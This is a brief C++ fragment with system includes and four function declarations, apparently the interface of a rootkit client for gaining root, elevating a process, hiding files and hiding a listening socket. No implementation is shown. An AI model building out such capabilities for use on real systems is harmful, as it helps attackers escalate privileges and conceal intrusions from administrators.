#include <iostream>
#include <cstring>
#include <unistd.h> 
#include <sys/ioctl.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <cstdlib>

#include "../constants.h"

int root_me();
int set_proc_root(pid_t pid);
int hide_filename(const char *fname);
int hide_listening_socket(unsigned short portnum);
